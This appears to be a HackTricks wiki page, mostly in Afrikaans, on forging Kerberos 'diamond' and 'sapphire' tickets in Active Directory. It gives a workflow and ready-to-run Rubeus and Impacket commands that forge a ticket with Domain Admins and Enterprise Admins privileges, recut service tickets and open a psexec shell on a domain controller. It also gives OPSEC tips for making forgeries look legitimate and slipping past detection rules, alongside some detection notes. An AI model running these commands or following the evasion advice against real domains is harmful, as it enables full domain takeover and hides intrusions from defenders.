# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Like a golden ticket**, a diamond ticket is a TGT wat gebruik kan word om **toegang tot enige diens as enige gebruiker** te kry. A golden ticket word heeltemal offline gemaak, versleutel met die krbtgt hash van daardie domein, en dan in 'n aanmeldsessie geplaas vir gebruik. Omdat domain controllers nie TGTs wat hulle wettiglik uitgereik het, opspoor nie, sal hulle sommer graag TGTs aanvaar wat met hul eie krbtgt hash versleutel is.

Daar is twee algemene tegnieke om die gebruik van golden tickets op te spoor:

- Soek na TGS-REQs wat geen ooreenstemmende AS-REQ het nie.
- Soek na TGTs met belaglike waardes, soos Mimikatz se standaard 10-jaar lewensduur.

A **diamond ticket** word gemaak deur die **velde van 'n wettige TGT wat deur 'n DC uitgereik is, te wysig**. Dit word bereik deur 'n **TGT** te **versoek**, dit met die domein se krbtgt hash te **ontsleutel**, die verlangde velde van die ticket te **wysig**, en dit dan weer te **hersleutel**. Dit **oorkom die twee eerder genoemde tekortkominge** van 'n golden ticket omdat:

- TGS-REQs sal 'n voorafgaande AS-REQ hê.
- Die TGT is deur 'n DC uitgereik, wat beteken dit sal al die korrekte besonderhede uit die domein se Kerberos-beleid hê. Alhoewel hierdie akkuraat in 'n golden ticket vervals kan word, is dit meer kompleks en vatbaar vir foute.

### Vereistes & workflow

- **Kriptografiese materiaal**: die krbtgt AES256 key (preferred) of NTLM hash om die TGT te dekripteer en weer te onderteken.
- **Wettige TGT blob**: verkry met `/tgtdeleg`, `asktgt`, `s4u`, of deur tickets uit geheue te exporteer.
- **Konteksdata**: die teiken gebruiker RID, groep RIDs/SIDs, en (opsioneel) LDAP-afgeleide PAC-attribuute.
- **Service keys** (slegs indien jy beplan om service tickets weer te sny): AES key van die diens SPN wat geïmpersoniseer gaan word.

1. Verkry 'n TGT vir enige beheerde gebruiker via AS-REQ (Rubeus `/tgtdeleg` is handig omdat dit die kliënt dwing om die Kerberos GSS-API-dans sonder credentials uit te voer).
2. Dekriptiseer die teruggegewe TGT met die krbtgt-sleutel, pas PAC-attribuute aan (gebruiker, groepe, aanmeldinligting, SIDs, toestel-claims, ens.).
3. Hersleutel/onderteken die ticket met dieselfde krbtgt-sleutel en injekteer dit in die huidige aanmeldsessie (`kerberos::ptt`, `Rubeus.exe ptt`...).
4. Opsioneel, herhaal die proses oor 'n service ticket deur 'n geldige TGT blob plus die teiken-diens sleutel te voorsien om stil op die netwerk te bly.

### Updated Rubeus tradecraft (2024+)

Onlangse werk deur Huntress het die `diamond` action binne Rubeus gemoderniseer deur die `/ldap` en `/opsec` verbeterings oor te dra wat voorheen slegs vir golden/silver tickets bestaan het. `/ldap` vul nou outomaties akkurate PAC-attribuute direk uit AD in (user profile, logon hours, sidHistory, domain policies), terwyl `/opsec` die AS-REQ/AS-REP-vloei ononderskeibaar van 'n Windows-kliënt maak deur die twee-stap pre-auth volgorde uit te voer en AES-only crypto af te dwing. Dit verminder dramaties voor die hand liggende aanwysers soos leë device IDs of onrealistiese geldigheidsvensters.
```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
/ticketuser:svc_sql /ticketuserid:1109 \
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
/opsec /nowrap
```
- `/ldap` (met die opsionele `/ldapuser` & `/ldappassword`) vra AD en SYSVOL om die geteikende gebruiker se PAC-beleidsdata te spieël.
- `/opsec` dwing 'n Windows-agtige AS-REQ-herhaling af, stel lawaaierige vlae na nul en bly by AES256.
- `/tgtdeleg` hou jou hande weg van die duidelike wagwoord of NTLM/AES sleutel van die slagoffer terwyl dit steeds 'n ontsleutelbare TGT teruggee.

### Service-ticket recutting

Dieselfde Rubeus-opdatering het die vermoë bygevoeg om die diamond technique op TGS blobs toe te pas. Deur `diamond` 'n **base64-encoded TGT** (van `asktgt`, `/tgtdeleg`, of 'n vooraf vervalste TGT), die **service SPN**, en die **service AES key** te voorsien, kan jy realistiese service tickets skep sonder om die KDC aan te raak — effektief 'n meer onopvallende silver ticket.
```powershell
./Rubeus.exe diamond \
/ticket:<BASE64_TGT_OR_KRB-CRED> \
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ldap /opsec /nowrap
```
Hierdie werkvloei is ideaal wanneer jy reeds beheer het oor 'n diensrekening-sleutel (bv. gedump met `lsadump::lsa /inject` of `secretsdump.py`) en 'n eenmalige TGS wil sny wat perfek by AD-beleid, tydlyne en PAC-data pas, sonder om enige nuwe AS/TGS-verkeer uit te gee.

### Sapphire-style PAC swaps (2025)

'n Nuwe variasie, soms 'n **sapphire ticket** genoem, kombineer Diamond se "real TGT" basis met **S4U2self+U2U** om 'n bevoorregte PAC te steel en dit in jou eie TGT te plaas. In plaas daarvan om bykomende SIDs uit te dink, versoek jy 'n U2U S4U2self ticket vir 'n hoogs-bevoegde gebruiker, ekstraheer daardie PAC, en sny dit in jou wettige TGT in voordat jy dit weer onderteken met die krbtgt sleutel. Omdat U2U `ENC-TKT-IN-SKEY` stel, lyk die gevolglike netwerkvloei soos 'n geldige gebruiker-tot-gebruiker-uitruiling.

Minimale Linux-kant reproduksie met Impacket se gepatchte `ticketer.py` (voeg sapphire-ondersteuning by):
```bash
python3 ticketer.py -request -impersonate 'DAuser' \
-domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333' \
--u2u --s4u2self
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```
Belangrike OPSEC-aanwysers wanneer hierdie variant gebruik word:

- TGS-REQ sal `ENC-TKT-IN-SKEY` en `additional-tickets` (die slagoffer se TGT) dra — skaars in normale verkeer.
- `sname` is dikwels gelyk aan die aansoeker (self-service toegang) en Event ID 4769 wys die oproeper en teiken as dieselfde SPN/user.
- Verwag gepaarde 4768/4769 inskrywings met dieselfde kliëntrekenaar maar verskillende CNAMES (low-priv requester vs. privileged PAC owner).

### OPSEC & detection notes

- Die tradisionele hunter heuristics (TGS without AS, decade-long lifetimes) bly van toepassing op golden tickets, maar diamond tickets kom hoofsaaklik na vore wanneer die **PAC-inhoud of groeptoewysing onmoontlik lyk**. Vul elke PAC-veld (logon hours, user profile paths, device IDs) sodat geoutomatiseerde vergelykings nie die vervalsing dadelik uitlig nie.
- **Moet NIE groepe/RIDs oorbelas nie**. If you only need `512` (Domain Admins) and `519` (Enterprise Admins), stop there and make sure the target account plausibly belongs to those groups elsewhere in AD. Oormatige `ExtraSids` is 'n duidelike wenk.
- Sapphire-style swaps laat U2U vingerafdrukke agter: `ENC-TKT-IN-SKEY` + `additional-tickets` + `sname == cname` in 4769, en 'n opvolg 4624 logon afkomstig van die vervalste ticket. Korreleer daardie velde in plaas daarvan om slegs na no-AS-REQ gapings te kyk.
- Microsoft het begin om **RC4 service ticket issuance** uit te faseer weens CVE-2026-20833; om AES-only etypes op die KDC af te dwing versterk die domein en stem ooreen met diamond/sapphire tooling (/opsec dwing reeds AES af). Om RC4 in vervalste PACs te meng sal toenemend uitstaan.
- Splunk's Security Content project versprei attack-range telemetry vir diamond tickets plus detections soos *Windows Domain Admin Impersonation Indicator*, wat abnormale Event ID 4768/4769/4624-reekse en PAC-groepveranderings korreleer. Herafspel van daardie dataset (of om jou eie te genereer met die opdragte hierbo) help om SOC-dekking vir T1558.001 te valideer terwyl dit jou konkrete waarskuwinglogika gee om te omseil.

## References

- [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
